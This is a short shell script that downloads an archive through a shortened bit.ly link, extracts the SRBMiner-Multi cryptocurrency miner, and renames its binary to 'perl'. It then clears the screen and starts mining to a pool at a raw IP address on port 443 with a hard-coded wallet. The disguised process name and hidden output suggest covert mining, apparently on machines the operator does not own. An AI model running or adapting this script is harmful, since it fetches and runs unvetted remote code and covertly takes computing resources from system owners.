wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI perl

nomer=$((RANDOM % 50 + 1))

clear

./perl --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
